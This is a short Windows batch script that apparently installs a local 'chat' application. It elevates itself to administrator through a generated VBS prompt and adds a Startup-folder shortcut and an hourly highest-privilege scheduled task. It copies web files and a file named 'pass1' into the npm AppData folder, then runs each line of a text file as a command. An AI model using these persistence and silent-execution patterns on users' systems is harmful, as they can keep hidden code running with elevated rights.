set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
:: start cmd /k echo Hello, World!
cd /d %~dp0
xcopy /y "%~dp0\*.bat" "c:\bat\*"
xcopy /y "%~dp0\*.lnk" "c:\bat\*"
xcopy /y "%~dp0\*.vbs" "c:\bat\*"
xcopy /y "%~dp0\*.ps1" "c:\bat\*"
copy "%~dp0\start_chat.vbs.lnk" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
SCHTASKS /CREATE /SC HOURLY /TN "MyTasks\Restart chat" /TR "C:\bat\start_chat.vbs" /RL HIGHEST
mkdir %AppData%\npm\files
xcopy /ievy "%~dp0\ssl" %AppData%\npm\ssl
xcopy /y "%~dp0\*.js" "%AppData%\npm\*"
xcopy /y "%~dp0\*.html" "%AppData%\npm\*"
xcopy /y "%~dp0\*.css" "%AppData%\npm\*"
xcopy /y "%~dp0\*.txt" "%AppData%\npm\*"
xcopy /y "%~dp0\pass1" "%AppData%\npm\"
cd %AppData%\npm
for /F "tokens=*" %%A in (packages_node.txt) do %%A


